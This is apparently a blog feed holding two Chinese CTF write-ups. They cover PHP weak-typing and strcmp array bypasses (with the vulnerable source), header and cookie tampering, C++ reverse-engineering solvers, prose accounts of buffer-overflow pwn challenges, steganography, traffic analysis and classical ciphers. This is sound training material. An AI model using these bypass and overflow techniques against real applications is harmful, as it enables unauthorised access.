这个题的考点就是PHP弱类型中0==string这个情况（PHP混乱邪恶无疑就是要让json_decode出来的结果是0，于是在沙盒http://sandbox.onlinephpfunctions[.]com/里实验出了结果然后去原网页的时候还失败了一次……因为传入的时候会再加对引号……这里必须感谢一下飘零大大指点的，一开始光想着怎么绕过正则，反而偏离了正轨顺便正则的效果大概是需要传入的字符串既有数字又有字母长度大于6就行 can u find me? Descriptiononly robot know where is the flag 那当然是robots.txt啦，这不是送？直接访问看到抓包看看，发现Cookie里有个user=补上，发出，得flag tell me what you want这个题就是纯练改HTTP头的点进去问你想要啥，你输flag告诉你用POST更好，然后之后每改一次都会告诉你新的要改的地方，全改完得到flag 我们不一样还是源码放出，还是弱类型12345678910include_once("flag.php");if (isset($_POST['str1']) &amp;&amp; isset($_POST['str2'])) &#123; if ($_POST['str1'] != $_POST['str2'] &amp;&amp; strcmp($_POST['str1'], $_POST['str2']) == 0) &#123; echo "flag is:".$flag; exit(); &#125; else &#123; echo "Something wrong.."; &#125;&#125; 这里的弱类型在于string和非string的strcmp返回0，而array!=string成立 Revre0拖进IDA，F5出flag baby_crack拖进IDA，F5，读代码。发现对操作做了这样的操作： 按位置进行循环移位 将输入的每个通过一个映射转到另一个 进行几轮交换 与flag进行同意操作得到的结果进行比较于是写出反着来的操作1234567891011121314151617181920//baby1.cpp#include &lt;bits/stdc++.h&gt;using namespace std;int indx[]=&#123;17,191,186,15,213,204,188,30,25,1,135,27,150,195,134,26,126,107,90,141,251,194,139,179,177,221,239,10,75,248,85,38,118,171,193,100,23,201,175,97,103,74,202,18,36,225,174,80,58,112,55,237,224,119,183,46,161,45,50,123,137,207,240,148,33,101,11,63,125,41,59,5,81,231,129,110,51,198,215,172,60,154,34,220,122,8,106,151,241,95,142,98,111,19,138,130,140,42,73,57,24,104,208,131,180,66,54,113,12,87,16,243,40,212,52,14,228,255,6,173,92,252,219,222,218,159,234,53,94,120,82,217,79,109,187,168,176,21,67,144,37,166,84,254,13,235,169,253,233,93,22,203,47,78,189,197,9,70,247,192,31,89,211,2,35,157,96,4,132,246,164,29,49,76,200,155,199,223,102,44,236,121,115,48,105,99,149,214,190,68,232,165,242,153,216,56,160,227,143,210,83,61,86,146,114,250,184,167,205,238,147,133,108,127,170,178,71,206,128,32,28,124,7,226,185,145,69,116,152,245,62,3,196,65,1,43,72,39,230,91,244,156,136,117,162,182,20,209,229,77,64,249,158,88,163&#125;;int arr[]=&#123;166,78,5,162,182,8,162,206,140,238,32,194,152,160,208,205,35,166,106,130&#125;;int main()&#123;// int a;// while(cin&gt;&gt;a)&#123;// cout&lt;&lt;indx[a]&lt;&lt;endl;// &#125; for(int i=0;i&lt;20;++i)&#123; for(int j=0;j&lt;256;++j)&#123; if(indx[j]==arr[i])&#123; cout&lt;&lt;int(*(char*)(&amp;j))&lt;&lt;','; &#125; &#125; &#125; return 0;&#125; 12345678910111213141516171819202122//baby2.cpp#include &lt;bits/stdc++.h&gt;using namespace std;int arr[]=&#123;141,153,71,245,246,85,245,217,96,209,219,21,228,196,102,208,164,141,86,95&#125;;int main()&#123;// for(int i=0;i&lt;20;++i)&#123;// newa[indx[i]]=arr[i];// &#125;// for(int i=0;i&lt;20;++i)&#123;// cout&lt;&lt;newa[i]&lt;&lt;',';// &#125; swap(arr[10],arr[15]); swap(arr[10],arr[6]); swap(arr[6],arr[3]); swap(arr[3],arr[1]); swap(arr[0],arr[1]); for(int i=0;i&lt;20;++i)&#123; printf("%d,",arr[i]); &#125; return 0;&#125; 1234567891011121314151617181920212223242526//baby3.cpp#include &lt;bits/stdc++.h&gt;using namespace std;uint8_t arr[]=&#123;208,141,71,153,246,85,245,217,96,209,245,21,228,196,102,219,164,141,86,95&#125;;unsigned char flg[22]="";int main()&#123; for(int i=0;i&lt;20;++i)&#123; bitset&lt;8&gt; a(arr[i]); cout&lt;&lt;a&lt;&lt;endl; if(i%4==1)&#123; a=(a&lt;&lt;6)|(a&gt;&gt;2); &#125;else if(i%4==2)&#123; a=(a&gt;&gt;4)|(a&lt;&lt;4); &#125;else if(i%4==3)&#123; a=(a&lt;&lt;2)|(a&gt;&gt;6); &#125;else&#123; a=(a&gt;&gt;1)|(a&lt;&lt;7); &#125; cout&lt;&lt;a&lt;&lt;' '&lt;&lt;a.to_ulong()&lt;&lt;endl; flg[i]=a.to_ulong(); &#125; for(int i=0;i&lt;20;++i)&#123; cout&lt;&lt;char(flg[i]); &#125;&#125; 这里需要说一下……C/C++的左右移有毒！换bitset保平安！ nop_pop一月霸权当然是我pop team epic啦！食我粪作！EXEinfo显示是PE文件，那就运行一下看打开OD搜一下先是把跳转nop掉，然后出来那个Con…的，联系出题人，出题人表示是要nop掉pop子于是再看，然后发现上面有个nop_me（提示真明显wwwww）nop掉，程序发给出题人，得到flag sc2_player看了一下程序F5出来的东西大概做了这几步操作 arr=(index%7+35)^special special(index%7)=special^0x34 arr=input^ index^(index/7)这几个都是长度为28的数组，arr是最后用来比对的数组，input是输入的flag，special是一个程序存储的数组所以前两步有什么意义……12345678910111213//sc2.cpp#include &lt;bits/stdc++.h&gt;using namespace std;char arr[29]=&#123;104,98,118,101,127,72,50,127,86,124,99,63,82,101,72,108,77,116,101,32,114,115,74,96,115,127,124,101&#125;;int main()&#123; for(int i=0;i&lt;28;++i)&#123; arr[i]=arr[i]^i^(i/7); &#125; for(int i=0;i&lt;28;++i)&#123; putchar(arr[i]); &#125;&#125; PWN前两题做的时候不在家，借朋友电脑用了下 guess_number其实是很明显的溢出，scanf这个东西不安全，可以直接覆盖到比较的数字 flag_server还是输入超限，不过一开始要输入长度而且还不能大于63，后面的对比又用!=（继续吐槽我那个超喜欢用!=的队友所以输入一个负数就好了然后就可以覆盖到猜测的数字了 zazahui先看整个流程，发现它先把flag读进了一个固定地址这次换成了read，但是大小却是188，于是还是能搞事，直接用地址覆盖后面的*s就能输出flag了本机测试过关直接发payload了，顺便*s后面是计数器，所以可以覆盖可以不覆盖，但是不能改成0，那样就直接退出了 Misc白菜1先用stegsolver打开看了一遍，都没东西于是考虑lsb（算是常规套路了吧）然后文件头不熟练的我还跑了下binwalk,wwwwwww就是个zip包，解压出来就是flag 白菜2跑一下binwalk，发现有东西然后就得到了flag pacp1搜下flag看最后这个返回200的分组 Crypto知识点全部给出来了哇，真系给力 easy Caesar一开始题目还有错，于是找出题人说，拿到了1血（然而改错没加分wwww）直接上工具然后数字也有变过，那么按照常识判断，就是qu1ck,4x,la2y,br0wn于是有了flag Polybius看到的时候就反应过来了，可惜当时没找到工具手解的……看它给的提示网址https://www.wikiwand[.]com/en/Polybius#/Cryptography就行了，这种出题真的很照顾人了 Hill学到了一种新的加密方式，不过要算数论中矩阵的逆，如果阶数高了，感觉就是灾难啊……顺便我又没找到工具一开始还没仔细看链接，矩阵的逆还是手算的……淦了同样的https://www.wikiwand[.]com/en/Hill_cipher confusion这个题就比较舒服，不就是大杂烩嘛，上工具~ baby step刚学完密码学，然而不想自己手写网上直接找的python脚本太腊鸡了……慢得不行最后换ACM大佬博客找的就好了解出来基础解是191091022097，然后加上i个0x1111111111模0x976693344d的逆元就好，顺便后面这个数是质数，所以逆元可以用费马小定理算]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>Misc</tag>
        <tag>PWN</tag>
        <tag>Web</tag>
        <tag>Rev</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HIT2018新生赛部分WP]]></title>
    <url>%2F2018%2F02%2F03%2FHIT2018%E6%96%B0%E7%94%9F%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[只会写水题，要好好学习了 Baby Android安卓逆向助手打开，发现就是异或，两个字符串摘一下异或一下得到flag Easy_XOR发现出题人拿同一个密钥加密了两个文件，而且还有一份明文，直接异或得到flag（所以感觉这个是不是没考中考点？） HITCTF 2018签到不会翻墙学个P的计算机呀，翻墙搜索看视频得到flag BaSO4就是base64/32混合嘛，其实这种混合的一般来说很好解，因为 Base64中有[0-9a-zA-Z+/=] Base32中有[A-Z2-7=] Base16中有[0-9A-F] 于是拿出以前写的脚本手动选择跑一下（等有空改成自动的） 攻击流量分析看前面就是尝试找flag未遂，一堆404，拖到最后终于看到200。 把数据保存下来跑一边gzuncompress就好 我是用在线工具搞得，所以为了复制不可见字符先base64一下咯 键盘流量分析首先用命令 1tshark -r keyboard.pcap -T field -e usb.capdata &gt; usbdata.txt 把按键数据抓出来 然后发现只有中间的是8字节的键盘数据，反正也不多就干脆看着敲出来了 用第三个字节查表，首字节的02表示上档键，这个不知道也可以猜出来 use_your_ida（时间到以后突然想到）时间到以后群友一说距离视图突然反应过来…… 给大佬递IDA.jpg…… 算是一种隐写吧，大概]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Misc</tag>
        <tag>Rev</tag>
      </tags>
  </entry>
</search>
